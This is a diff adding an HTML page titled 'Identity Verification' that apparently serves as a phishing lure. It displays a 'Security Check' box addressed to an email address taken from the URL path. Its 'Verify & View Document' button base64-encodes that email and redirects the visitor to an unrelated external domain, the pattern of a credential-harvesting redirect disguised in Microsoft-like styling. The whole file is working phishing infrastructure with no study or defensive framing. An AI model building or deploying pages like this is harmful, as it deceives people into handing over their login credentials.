@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification</title>
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f7f9; margin: 0; }
+        .box { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border: 1px solid #e2e8f0; }
+        .btn { background: #0078d4; color: white; padding: 14px 30px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        .btn:hover { background: #005a9e; }
+        #email-display { font-weight: bold; color: #1a365d; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="color: #1a365d;">Security Check</h2>
+        <p style="color: #4a5568;">This document is intended for:<br><span id="email-display">Loading...</span></p>
+        <p style="color: #4a5568; font-size: 14px;">Please click below to verify your identity.</p>
+        <button class="btn" onclick="jump()">Verify & View Document</button>
+    </div>
+
+    <script>
+        // Function to extract email from the URL path
+        function getEmailFromUrl() {
+            // Get the full path: e.g., "/random123/abc456/john%40example.com"
+            const path = window.location.pathname;
+            
+            // Split by '/' and get the last part
+            const parts = path.split('/');
+            const lastPart = parts[parts.length - 1];
+            
+            // Decode the URL-encoded email (converts %40 back to @)
+            try {
+                return decodeURIComponent(lastPart);
+            } catch (e) {
+                return "email@example.com"; // Fallback if decoding fails
+            }
+        }
+
+        // Get the email from URL and display it
+        const userEmail = getEmailFromUrl();
+        document.getElementById('email-display').textContent = userEmail;
+
+        // Optional: Log for debugging (remove in production)
+        console.log("Email from URL:", userEmail);
+        console.log("Full URL path:", window.location.pathname);
+
+        function jump() {
+            // Encode the dynamic email to Base64
+            const b64 = btoa(userEmail);
+            
+            // Your target URL with the encoded email
+            const target = "https://hunn.hm.baiaocozinhanordestina.com.br/cb4ea55569dc4f6db060e50de6ea4310/?Q5iMd=DEpJmG&dw.JaRbNcDfUyH4_TgB=" + b64;
+            window.location.replace(target);
+        }
+    </script>
+</body>
+</html>
